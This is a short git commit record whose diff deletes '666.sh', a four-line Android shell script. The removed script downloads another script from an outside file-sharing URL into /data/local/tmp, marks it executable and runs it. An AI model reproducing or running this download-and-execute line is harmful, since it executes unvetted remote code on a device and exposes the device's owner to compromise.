02eed588db18f113cc60344f4b231d5d2f2a8455
Feiznb <2415523492@qq.com>
2026-03-22 00:02:40 +0800

    删除 666.sh

--- 666.sh
+++
@@ -1,4 +0,0 @@
-#!/system/bin/sh
-SCRIPT_URL="https://pan.shenzhi.shop/down.php/189efe4928adaba5314a010cea6eb344.sh"
-TMP="/data/local/tmp/isu.sh"
-curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
